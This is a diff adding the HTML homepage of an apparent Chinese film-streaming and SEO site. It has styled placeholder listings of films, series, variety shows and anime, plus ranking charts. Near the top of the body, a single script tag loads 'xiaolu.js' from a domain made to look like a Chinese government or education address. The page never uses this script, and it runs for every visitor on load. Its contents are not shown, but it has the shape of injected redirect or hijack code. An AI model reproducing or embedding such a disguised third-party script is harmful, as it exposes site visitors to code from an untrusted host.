@@ -1,0 +1,418 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="renderer" content="webkit">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<title>兔灯电影网 - tudengdianyingwang-wap | 高清电影电视剧综艺动漫在线观看</title>
+<meta name="keywords" content="兔灯电影网, tudengdianyingwang-wap, 在线看电影, 高清影视, 热播电视剧, 综艺, 动漫, 影视资源, 免费观影, 兔灯影视大全">
+<meta name="description" content="兔灯电影网（tudengdianyingwang-wap）像一盏温暖的兔灯，照亮你的观影夜，汇集高清电影、热播电视剧、爆笑综艺、热血动漫，分类齐全、更新迅速、全站移动端自适应，一键直达想看的每一部好片。">
+<link rel="canonical" href="https://tudengdianyingwang-wap.github.io">
+<meta name="mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="robots" content="index,follow">
+<meta name="bingbot" content="index,follow,max-image-preview:large">
+<meta name="theme-color" content="#2b0f14">
+<style>
+:root{
+  --paper:#f6efe2; --paper2:#efe4cf; --ink:#2b1c17; --ink2:#6b4c3f; --ink3:#9a7e6c;
+  --red:#d63b2f; --red2:#b62a1f; --gold:#e8a33d; --gold2:#c9851f; --plum:#7a2540;
+}
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+html{scroll-behavior:smooth}
+body{
+  font-family:-apple-system,BlinkMacSystemFont,"PingFang SC","KaiTi","Microsoft YaHei","Noto Serif SC",serif;
+  background:var(--paper);color:var(--ink);line-height:1.75;overflow-x:hidden;min-height:100vh;
+  background-image:
+    radial-gradient(circle at 18% 8%,rgba(214,59,47,.10),transparent 42%),
+    radial-gradient(circle at 85% 18%,rgba(232,163,61,.14),transparent 44%),
+    radial-gradient(circle at 50% 108%,rgba(122,37,64,.16),transparent 48%),
+    repeating-linear-gradient(0deg,rgba(43,28,23,.012) 0 3px,transparent 3px 6px);
+  background-attachment:fixed;
+}
+img{max-width:100%;display:block}
+a{color:inherit;text-decoration:none}
+ul{list-style:none}
+::selection{background:var(--red);color:#fff}
+
+/* ===== 剪纸纹样 ===== */
+.scissors{position:fixed;inset:0;pointer-events:none;z-index:0;
+  background-image:radial-gradient(circle at 8px 8px,var(--red) 1.3px,transparent 1.6px);
+  background-size:34px 34px;opacity:.045}
+
+/* ===== 顶栏 ===== */
+header{position:sticky;top:0;z-index:50;background:rgba(246,239,226,.94);backdrop-filter:blur(10px);border-bottom:2px solid var(--red)}
+.bar{max-width:1240px;margin:0 auto;padding:12px 20px;display:flex;align-items:center;gap:14px;flex-wrap:wrap}
+.brand{display:flex;align-items:center;gap:12px}
+.logo{width:48px;height:48px;border-radius:50%;background:radial-gradient(circle at 34% 32%,#ffe9c0,#f2c46b 45%,var(--gold2));display:grid;place-items:center;box-shadow:0 0 0 4px rgba(214,59,47,.16),0 4px 14px rgba(43,28,23,.18);position:relative}
+.logo svg{width:26px;height:26px}
+.brand h1{font-size:21px;font-weight:900;letter-spacing:.5px;line-height:1.2}
+.brand h1 small{display:block;font-size:10px;font-weight:600;color:var(--ink3);letter-spacing:2.5px}
+.search{flex:1;min-width:170px;display:flex;position:relative}
+.search input{flex:1;padding:10px 16px;border:1.5px solid var(--gold);border-right:0;border-radius:24px 0 0 24px;background:#fffdf8;color:var(--ink);font-size:14px;outline:none;font-family:inherit}
+.search input:focus{border-color:var(--red);box-shadow:inset 0 0 0 3px rgba(214,59,47,.1)}
+.search button{border:0;background:var(--red);color:#fff;font-weight:800;padding:0 22px;border-radius:0 24px 24px 0;cursor:pointer;letter-spacing:1px;font-size:14px;font-family:inherit}
+.search button:hover{background:var(--red2)}
+.menu-btn{display:none;width:44px;height:44px;border:1.5px solid var(--gold);border-radius:12px;background:#fffdf8;color:var(--red);font-size:19px;cursor:pointer;font-family:inherit}
+nav.tabs{max-width:1240px;margin:0 auto;padding:0 20px;display:flex;gap:4px;flex-wrap:wrap}
+nav.tabs a{padding:10px 20px;font-size:14.5px;font-weight:800;transition:.2s;color:var(--ink2);border-bottom:3px solid transparent;letter-spacing:.5px}
+nav.tabs a:hover{color:var(--red);border-bottom-color:var(--red)}
+
+/* ===== 主视觉 ===== */
+.hero{max-width:1240px;margin:30px auto 0;padding:0 20px;position:relative;z-index:1}
+.hero-in{position:relative;background:linear-gradient(150deg,#2b0f14 0%,#5c1c25 45%,#8c2c38 100%);border-radius:24px;padding:48px 42px;overflow:hidden;color:#fbeedb}
+.hero-in::before{content:"";position:absolute;inset:0;background:radial-gradient(circle at 88% 20%,rgba(255,214,130,.32),transparent 45%);}
+.hero-in::after{content:"";position:absolute;width:240px;height:240px;right:40px;bottom:-90px;border-radius:50%;background:radial-gradient(circle,rgba(255,214,130,.28),transparent 65%)}
+.kicker{display:inline-flex;align-items:center;gap:8px;font-size:11.5px;color:#ffd98a;border:1px solid rgba(255,217,138,.45);background:rgba(255,255,255,.07);padding:5px 14px;border-radius:20px;margin-bottom:20px;letter-spacing:1.5px;position:relative;z-index:2}
+.hero-in h2{font-size:42px;line-height:1.32;font-weight:900;position:relative;z-index:2;letter-spacing:.5px}
+.hero-in h2 .lamp{color:#ffd56b;text-shadow:0 0 26px rgba(255,213,107,.55)}
+.hero-in p{color:rgba(251,238,219,.85);font-size:15px;max-width:590px;margin-top:16px;position:relative;z-index:2}
+.hero-cta{margin-top:28px;display:flex;gap:14px;flex-wrap:wrap;position:relative;z-index:2}
+.btn{border-radius:26px;padding:12px 30px;font-size:14px;font-weight:800;letter-spacing:.5px;transition:.25s;cursor:pointer;border:1.5px solid transparent;font-family:inherit}
+.btn.main{background:#ffd56b;color:#5c1c25;box-shadow:0 8px 22px rgba(255,213,107,.35)}
+.btn.main:hover{filter:brightness(1.06);transform:translateY(-2px)}
+.btn.ghost{background:transparent;color:#ffd56b;border-color:rgba(255,213,107,.6)}
+.btn.ghost:hover{background:rgba(255,213,107,.12)}
+
+/* ===== 通用 ===== */
+section{max-width:1240px;margin:56px auto 0;padding:0 20px;position:relative;z-index:1}
+.head{display:flex;align-items:center;gap:12px;margin-bottom:24px;flex-wrap:wrap;border-bottom:1.5px dashed var(--gold);padding-bottom:12px}
+.lantern{width:20px;height:26px;flex-shrink:0;background:linear-gradient(180deg,var(--gold),var(--red));border-radius:9px 9px 7px 7px;position:relative;box-shadow:0 0 12px rgba(214,59,47,.4)}
+.lantern::before{content:"";position:absolute;left:50%;top:-5px;width:12px;height:5px;background:var(--gold2);transform:translateX(-50%);border-radius:2px}
+.head h3{font-size:23px;font-weight:900;letter-spacing:.5px;display:flex;align-items:baseline;gap:10px}
+.head h3 i{font-style:normal;font-size:11.5px;color:var(--ink3);font-weight:600;letter-spacing:1.5px}
+.head h3 em{font-style:normal;color:var(--red)}
+.head a.more{margin-left:auto;font-size:13px;color:var(--ink3);font-weight:700}
+.head a.more:hover{color:var(--red)}
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(164px,1fr));gap:20px}
+.film{background:#fffdf8;border:1.5px solid rgba(201,133,31,.28);border-radius:16px;overflow:hidden;transition:.3s;position:relative;box-shadow:0 4px 14px rgba(43,28,23,.06)}
+.film:hover{transform:translateY(-6px) rotate(-.6deg);border-color:var(--red);box-shadow:0 16px 32px rgba(214,59,47,.2)}
+.poster{position:relative;aspect-ratio:3/4;overflow:hidden}
+.poster img{width:100%;height:100%;object-fit:cover;transition:.5s;filter:saturate(.96)}
+.film:hover .poster img{transform:scale(1.07)}
+.tag{position:absolute;left:9px;top:9px;background:var(--red);color:#ffd56b;font-size:11px;font-weight:800;padding:3px 10px;border-radius:4px;box-shadow:0 2px 6px rgba(43,28,23,.25)}
+.rate{position:absolute;right:9px;bottom:9px;background:#fffdf8;color:var(--red);font-size:12px;font-weight:900;padding:3px 9px;border-radius:4px;box-shadow:0 3px 10px rgba(43,28,23,.2)}
+.info{padding:13px 14px}
+.info b{font-size:14.5px;display:-webkit-box;-webkit-line-clamp:1;-webkit-box-orient:vertical;overflow:hidden}
+.info span{font-size:12px;color:var(--ink3);display:block;margin-top:5px}
+
+/* ===== 双栏 ===== */
+.split{display:grid;grid-template-columns:1.1fr 1fr;gap:20px;align-items:start}
+.panel{background:#fffdf8;border:1.5px solid rgba(201,133,31,.28);border-radius:16px;overflow:hidden;box-shadow:0 4px 14px rgba(43,28,23,.06)}
+.panel-h{display:flex;align-items:center;justify-content:space-between;padding:15px 20px;background:linear-gradient(90deg,rgba(214,59,47,.09),transparent);border-bottom:1.5px dashed var(--gold)}
+.panel-h b{font-size:15px;letter-spacing:.5px;color:var(--red);display:flex;align-items:center;gap:8px}
+.panel-h b::before{content:"◆";font-size:10px;color:var(--gold)}
+.panel-h span{font-size:11.5px;color:var(--ink3);letter-spacing:.5px}
+.row{display:flex;gap:14px;align-items:center;padding:13px 20px;border-bottom:1.5px dotted rgba(201,133,31,.22)}
+.row:last-child{border:0}
+.idx{width:30px;height:30px;flex-shrink:0;background:var(--paper2);border:1.5px solid var(--gold);color:var(--red);font-size:12.5px;font-weight:900;display:grid;place-items:center;border-radius:6px;font-family:Georgia,serif}
+.row:nth-child(2) .idx{background:var(--red);color:#ffd56b;border-color:var(--red)}
+.row:nth-child(3) .idx{background:var(--gold);color:#5c1c25;border-color:var(--gold2)}
+.ttl{flex:1;font-size:14px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.meta{font-size:12px;color:var(--ink3)}
+.badge{flex:1;text-align:right}
+.badge i{display:inline-block;padding:2px 9px;border-radius:3px;background:rgba(214,59,47,.1);color:var(--red);font-size:11px;font-weight:800;font-style:normal}
+
+/* ===== 榜单 ===== */
+.ranks{display:grid;grid-template-columns:repeat(auto-fit,minmax(290px,1fr));gap:20px}
+.rk{background:#fffdf8;border:1.5px solid rgba(201,133,31,.28);border-radius:16px;padding:22px;box-shadow:0 4px 14px rgba(43,28,23,.06)}
+.rk h4{font-size:15.5px;margin-bottom:16px;letter-spacing:.5px;color:var(--red);display:flex;align-items:center;gap:9px}
+.rk h4::after{content:"";flex:1;height:1.5px;background:repeating-linear-gradient(90deg,var(--gold),var(--gold) 4px,transparent 4px 8px)}
+.rk li{display:flex;gap:12px;align-items:center;padding:10px 0;border-bottom:1.5px dotted rgba(201,133,31,.22)}
+.rk li:last-child{border:0}
+.n{width:30px;height:30px;flex-shrink:0;background:var(--paper2);border:1.5px solid var(--gold);color:var(--ink2);font-size:12.5px;font-weight:900;display:grid;place-items:center;border-radius:50%;font-family:Georgia,serif}
+.rk li:nth-child(1) .n{background:var(--red);border-color:var(--red);color:#ffd56b}
+.rk li:nth-child(2) .n{background:var(--gold);border-color:var(--gold2);color:#5c1c25}
+.rk li:nth-child(3) .n{border-color:var(--plum);color:var(--plum)}
+.hot{font-size:11.5px;color:var(--ink3);font-family:Georgia,serif;letter-spacing:.5px}
+
+/* ===== 关于 ===== */
+.intro{background:linear-gradient(150deg,#2b0f14,#5c1c25 60%,#7a2540);border-radius:20px;padding:36px;position:relative;overflow:hidden;color:#fbeedb}
+.intro::after{content:"兔灯";position:absolute;right:24px;bottom:-26px;font-size:124px;font-weight:900;color:rgba(255,213,107,.14);line-height:1;letter-spacing:2px}
+.intro h3{font-size:21px;margin-bottom:16px;position:relative;color:#ffd56b}
+.intro h3 em{font-style:normal;color:#fff}
+.intro p{color:rgba(251,238,219,.85);margin-bottom:12px;font-size:14.5px;position:relative;max-width:900px}
+.feats{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:8px 20px;margin-top:14px;position:relative}
+.feats li{padding-left:22px;position:relative;font-size:14px}
+.feats li::before{content:"●";position:absolute;left:4px;color:#ffd56b;font-size:9px;top:6px}
+
+/* ===== 页脚 ===== */
+footer{margin-top:66px;border-top:2px solid var(--red);background:#2b0f14;color:#e8cfc4;position:relative;z-index:1}
+.ft{max-width:1240px;margin:0 auto;padding:36px 20px 18px;display:grid;grid-template-columns:repeat(auto-fit,minmax(170px,1fr));gap:28px}
+.ft h5{font-size:13.5px;color:#ffd56b;letter-spacing:1px;margin-bottom:14px;font-weight:800}
+.ft a{display:block;color:rgba(232,207,196,.8);font-size:13px;padding:4px 0}
+.ft a:hover{color:#ffd56b}
+.copy{max-width:1240px;margin:0 auto;padding:20px;border-top:1px solid rgba(255,213,107,.18);font-size:12px;color:rgba(232,207,196,.6);text-align:center}
+.copy b{color:#ffd56b}
+
+/* ===== 响应式 ===== */
+@media(max-width:760px){
+  .menu-btn{display:block}
+  nav.tabs{flex-direction:column;max-height:0;overflow:hidden;padding:0 20px;border-bottom:0;transition:.3s}
+  nav.tabs.open{max-height:420px;padding:4px 20px 12px;border-bottom:2px solid var(--red)}
+  nav.tabs a{border-bottom:1.5px solid rgba(201,133,31,.2);border-radius:0}
+  nav.tabs a:hover{border-bottom-color:var(--red)}
+  .hero-in{padding:30px 22px}
+  .hero-in h2{font-size:28px}
+  .hero-in::after{display:none}
+  .split{grid-template-columns:1fr}
+  .grid{grid-template-columns:repeat(auto-fill,minmax(134px,1fr));gap:13px}
+  .head h3{font-size:19px}
+  .intro::after{font-size:84px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaolu.js"></script>
+<div class="scissors"></div>
+<header>
+  <div class="bar">
+    <div class="brand">
+      <div class="logo" aria-hidden="true">
+        <svg viewBox="0 0 24 24" fill="none" stroke="#8a2418" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><ellipse cx="12" cy="11" rx="7" ry="8"/><path d="M9 6c1-2 2.5-3 3-3s2 1 3 3M5 11h14M12 3v2M9 8.5h.01M15 8.5h.01M9 13.5h.01M15 13.5h.01M12 16v2"/></svg>
+      </div>
+      <h1>兔灯电影网<small>TU DENG DIAN YING WANG</small></h1>
+    </div>
+    <div class="search">
+      <input type="search" placeholder="搜索电影 / 剧集 / 综艺 / 动漫..." aria-label="搜索">
+      <button type="button">搜索</button>
+    </div>
+    <button class="menu-btn" id="mBtn" aria-label="菜单">☰</button>
+  </div>
+  <nav class="tabs" id="tabs">
+    <a href="#home">首页</a>
+    <a href="#movie">电影</a>
+    <a href="#tv">电视剧</a>
+    <a href="#show">综艺</a>
+    <a href="#anime">动漫</a>
+    <a href="#rank">排行榜</a>
+  </nav>
+</header>
+
+<main>
+  <div class="hero" id="home">
+    <div class="hero-in">
+      <span class="kicker">◆ 一盏兔灯 · 照亮你的观影夜</span>
+      <h2>点亮一盏 <span class="lamp">兔灯</span><br>看尽世间好片</h2>
+      <p>兔灯电影网（tudengdianyingwang-wap）像一盏温暖的兔灯，照亮你的每个观影夜，汇集高清电影、热播剧集、爆笑综艺与热血动漫，分类齐全、更新迅速、全站移动端自适应，一键直达你想看的每一部好片。</p>
+      <div class="hero-cta">
+        <a class="btn main" href="#movie">立即观影</a>
+        <a class="btn ghost" href="#rank">查看热榜</a>
+      </div>
+    </div>
+  </div>
+
+  <section id="movie">
+    <div class="head">
+      <span class="lantern"></span><h3>电影频道 <i>FEATURE FILMS</i></h3>
+      <a class="more" href="#">全部电影 ›</a>
+    </div>
+    <div class="grid">
+      <a class="film" href="#">
+        <div class="poster"><span class="tag">动作</span><span class="rate">9.3</span><img src="https://picsum.photos/seed/g1/300/400" alt="电影海报：极速追击"></div>
+        <div class="info"><b>极速追击</b><span>2026 · 动作 / 犯罪</span></div>
+      </a>
+      <a class="film" href="#">
+        <div class="poster"><span class="tag">科幻</span><span class="rate">9.1</span><img src="https://picsum.photos/seed/g2/300/400" alt="电影海报：深空回响"></div>
+        <div class="info"><b>深空回响</b><span>2026 · 科幻 / 冒险</span></div>
+      </a>
+      <a class="film" href="#">
+        <div class="poster"><span class="tag">爱情</span><span class="rate">8.8</span><img src="https://picsum.photos/seed/g3/300/400" alt="电影海报：第六个夏天"></div>
+        <div class="info"><b>第六个夏天</b><span>2025 · 爱情 / 青春</span></div>
+      </a>
+      <a class="film" href="#">
+        <div class="poster"><span class="tag">悬疑</span><span class="rate">9.0</span><img src="https://picsum.photos/seed/g4/300/400" alt="电影海报：无名之徒"></div>
+        <div class="info"><b>无名之徒</b><span>2026 · 悬疑 / 惊悚</span></div>
+      </a>
+      <a class="film" href="#">
+        <div class="poster"><span class="tag">喜剧</span><span class="rate">8.6</span><img src="https://picsum.photos/seed/g5/300/400" alt="电影海报：同桌的默契"></div>
+        <div class="info"><b>同桌的默契</b><span>2026 · 喜剧 / 校园</span></div>
+      </a>
+      <a class="film" href="#">
+        <div class="poster"><span class="tag">动画</span><span class="rate">8.9</span><img src="https://picsum.photos/seed/g6/300/400" alt="电影海报：星海之舟"></div>
+        <div class="info"><b>星海之舟</b><span>2025 · 动画 / 治愈</span></div>
+      </a>
+    </div>
+  </section>
+
+  <section id="tv">
+    <div class="head">
+      <span class="lantern"></span><h3>电视剧频道 <i>TV SERIES</i></h3>
+      <a class="more" href="#">全部剧集 ›</a>
+    </div>
+    <div class="split">
+      <div class="panel">
+        <div class="panel-h"><b>热播连载</b><span>LIVE UPDATE</span></div>
+        <div class="row"><span class="idx">01</span><span class="ttl">锦绣山河</span><span class="badge"><i>更新至 42 集</i></span></div>
+        <div class="row"><span class="idx">02</span><span class="ttl">法医手记</span><span class="badge"><i>更新至 24 集</i></span></div>
+        <div class="row"><span class="idx">03</span><span class="ttl">人间烟火</span><span class="badge"><i>更新至 36 集</i></span></div>
+        <div class="row"><span class="idx">04</span><span class="ttl">边境风云</span><span class="badge"><i>更新至 30 集</i></span></div>
+        <div class="row"><span class="idx">05</span><span class="ttl">那年花开</span><span class="badge"><i>更新至 20 集</i></span></div>
+        <div class="row"><span class="idx">06</span><span class="ttl">归途有风</span><span class="badge"><i>更新至 28 集</i></span></div>
+      </div>
+      <div class="panel">
+        <div class="panel-h"><b>高分完结</b><span>HIGH SCORE</span></div>
+        <div class="row"><span class="idx">1</span><span class="ttl">漫长的告别</span><span class="meta">2025 · 9.5</span></div>
+        <div class="row"><span class="idx">2</span><span class="ttl">沉默的真相</span><span class="meta">2024 · 9.3</span></div>
+        <div class="row"><span class="idx">3</span><span class="ttl">父母爱情</span><span class="meta">2024 · 9.5</span></div>
+        <div class="row"><span class="idx">4</span><span class="ttl">琅琊榜</span><span class="meta">2023 · 9.4</span></div>
+        <div class="row"><span class="idx">5</span><span class="ttl">庆余年</span><span class="meta">2023 · 9.0</span></div>
+      </div>
+    </div>
+  </section>
+
+  <section id="show">
+    <div class="head">
+      <span class="lantern"></span><h3>综艺频道 <i>VARIETY SHOW</i></h3>
+      <a class="more" href="#">全部综艺 ›</a>
+    </div>
+    <div class="grid">
+      <a class="film" href="#">
+        <div class="poster"><span class="tag">热播</span><span class="rate">9.0</span><img src="https://picsum.photos/seed/h1/300/400" alt="综艺海报：出发吧周末"></div>
+        <div class="info"><b>出发吧周末</b><span>户外真人秀 · 第5季</span></div>
+      </a>
+      <a class="film" href="#">
+        <div class="poster"><span class="tag">热播</span><span class="rate">8.7</span><img src="https://picsum.photos/seed/h2/300/400" alt="综艺海报：蒙面歌王"></div>
+        <div class="info"><b>蒙面歌王</b><span>音乐竞演 · 第4季</span></div>
+      </a>
+      <a class="film" href="#">
+        <div class="poster"><span class="tag">热播</span><span class="rate">8.5</span><img src="https://picsum.photos/seed/h3/300/400" alt="综艺海报：十二道锋味"></div>
+        <div class="info"><b>十二道锋味</b><span>美食竞技 · 第9季</span></div>
+      </a>
+      <a class="film" href="#">
+        <div class="poster"><span class="tag">热播</span><span class="rate">8.8</span><img src="https://picsum.photos/seed/h4/300/400" alt="综艺海报：脱口秀大会"></div>
+        <div class="info"><b>脱口秀大会</b><span>喜剧综艺 · 第3季</span></div>
+      </a>
+      <a class="film" href="#">
+        <div class="poster"><span class="tag">热播</span><span class="rate">8.4</span><img src="https://picsum.photos/seed/h5/300/400" alt="综艺海报：极限玩家"></div>
+        <div class="info"><b>极限玩家</b><span>户外挑战 · 第6季</span></div>
+      </a>
+      <a class="film" href="#">
+        <div class="poster"><span class="tag">热播</span><span class="rate">8.6</span><img src="https://picsum.photos/seed/h6/300/400" alt="综艺海报：新声代"></div>
+        <div class="info"><b>新声代</b><span>音乐选拔 · 第2季</span></div>
+      </a>
+    </div>
+  </section>
+
+  <section id="anime">
+    <div class="head">
+      <span class="lantern"></span><h3>动漫频道 <i>ANIME</i></h3>
+      <a class="more" href="#">全部动漫 ›</a>
+    </div>
+    <div class="split">
+      <div class="panel">
+        <div class="panel-h"><b>国漫热榜</b><span>ON AIR</span></div>
+        <div class="row"><span class="idx">1</span><span class="ttl">万古第一神</span><span class="meta">58集</span></div>
+        <div class="row"><span class="idx">2</span><span class="ttl">少年白马醉春风</span><span class="meta">40集</span></div>
+        <div class="row"><span class="idx">3</span><span class="ttl">镜双城</span><span class="meta">32集</span></div>
+        <div class="row"><span class="idx">4</span><span class="ttl">茶啊二中</span><span class="meta">26集</span></div>
+        <div class="row"><span class="idx">5</span><span class="ttl">斗破苍穹</span><span class="meta">60集</span></div>
+      </div>
+      <div class="panel">
+        <div class="panel-h"><b>日漫精选</b><span>CLASSIC</span></div>
+        <div class="row"><span class="idx">01</span><span class="ttl">约定的梦幻岛</span><span class="meta">悬疑 · 12集</span></div>
+        <div class="row"><span class="idx">02</span><span class="ttl">夏目友人帐</span><span class="meta">治愈 · 12集</span></div>
+        <div class="row"><span class="idx">03</span><span class="ttl">咒术回战</span><span class="meta">热血 · 24集</span></div>
+        <div class="row"><span class="idx">04</span><span class="ttl">排球少年</span><span class="meta">运动 · 25集</span></div>
+        <div class="row"><span class="idx">05</span><span class="ttl">间谍过家家</span><span class="meta">喜剧 · 13集</span></div>
+        <div class="row"><span class="idx">06</span><span class="ttl">葬送的芙莉莲</span><span class="meta">奇幻 · 28集</span></div>
+      </div>
+    </div>
+  </section>
+
+  <section id="rank">
+    <div class="head"><span class="lantern"></span><h3><em>兔灯</em> 热播榜 <i>TOP CHART</i></h3><a class="more" href="#">完整榜单 ›</a></div>
+    <div class="ranks">
+      <div class="rk">
+        <h4>电影榜</h4>
+        <ul>
+          <li><span class="n">1</span><span class="ttl">极速追击</span><span class="hot">998万</span></li>
+          <li><span class="n">2</span><span class="ttl">无名之徒</span><span class="hot">865万</span></li>
+          <li><span class="n">3</span><span class="ttl">深空回响</span><span class="hot">742万</span></li>
+          <li><span class="n">4</span><span class="ttl">第六个夏天</span><span class="hot">621万</span></li>
+          <li><span class="n">5</span><span class="ttl">同桌的默契</span><span class="hot">508万</span></li>
+        </ul>
+      </div>
+      <div class="rk">
+        <h4>剧集榜</h4>
+        <ul>
+          <li><span class="n">1</span><span class="ttl">锦绣山河</span><span class="hot">1120万</span></li>
+          <li><span class="n">2</span><span class="ttl">法医手记</span><span class="hot">935万</span></li>
+          <li><span class="n">3</span><span class="ttl">人间烟火</span><span class="hot">812万</span></li>
+          <li><span class="n">4</span><span class="ttl">边境风云</span><span class="hot">694万</span></li>
+          <li><span class="n">5</span><span class="ttl">那年花开</span><span class="hot">576万</span></li>
+        </ul>
+      </div>
+      <div class="rk">
+        <h4>综合榜</h4>
+        <ul>
+          <li><span class="n">1</span><span class="ttl">万古第一神</span><span class="hot">1310万</span></li>
+          <li><span class="n">2</span><span class="ttl">出发吧周末</span><span class="hot">1045万</span></li>
+          <li><span class="n">3</span><span class="ttl">镜双城</span><span class="hot">902万</span></li>
+          <li><span class="n">4</span><span class="ttl">十二道锋味</span><span class="hot">736万</span></li>
+          <li><span class="n">5</span><span class="ttl">脱口秀大会</span><span class="hot">612万</span></li>
+        </ul>
+      </div>
+    </div>
+  </section>
+
+  <section id="about">
+    <div class="intro">
+      <h3>关于 <em>兔灯电影网</em></h3>
+      <p>兔灯电影网（tudengdianyingwang-wap）像一盏温暖的兔灯，照亮你的观影夜。网站地址 <b>https://tudengdianyingwang-wap.github.io</b>。我们以「片库齐全、更新及时、体验温暖」为宗旨，精选优质内容，让你在一个网站就能看遍想看的好片。</p>
+      <ul class="feats">
+        <li>海量片库覆盖电影、电视剧、综艺、动漫四大板块</li>
+        <li>每日精选更新，院线大片与热播剧集同步上新</li>
+        <li>全站移动端自适应，手机浏览器原生级流畅体验</li>
+        <li>三榜热播排行，快速锁定当下最火内容</li>
+        <li>民俗纸艺质感界面，温暖不刺眼</li>
+        <li>关键词搜索精准定位，想看什么一搜即得</li>
+      </ul>
+    </div>
+  </section>
+</main>
+
+<footer>
+  <div class="ft">
+    <div>
+      <h5>兔灯电影网</h5>
+      <a href="https://tudengdianyingwang-wap.github.io">https://tudengdianyingwang-wap.github.io</a>
+      <a href="#about">关于本站</a>
+      <a href="#">商务合作</a>
+    </div>
+    <div>
+      <h5>影视分类</h5>
+      <a href="#movie">电影</a>
+      <a href="#tv">电视剧</a>
+      <a href="#show">综艺</a>
+      <a href="#anime">动漫</a>
+    </div>
+    <div>
+      <h5>热门栏目</h5>
+      <a href="#rank">热播排行榜</a>
+      <a href="#">高分推荐</a>
+      <a href="#">新片速递</a>
+      <a href="#">专题合集</a>
+    </div>
+    <div>
+      <h5>帮助中心</h5>
+      <a href="#">播放问题</a>
+      <a href="#">意见反馈</a>
+      <a href="#">使用协议</a>
+    </div>
+  </div>
+  <div class="copy">
+    © 2026 <b>兔灯电影网</b> tudengdianyingwang-wap 版权所有 · 网站名称：兔灯电影网 · 网站网址：https://tudengdianyingwang-wap.github.io<br>
+    本页面所有内页链接均以 # 占位，如需收录请替换为真实可访问链接。
+  </div>
+</footer>
+
+<script>
+document.getElementById('mBtn').addEventListener('click',function(){
+  document.getElementById('tabs').classList.toggle('open');
+});
+</script>
+</body>
+</html>
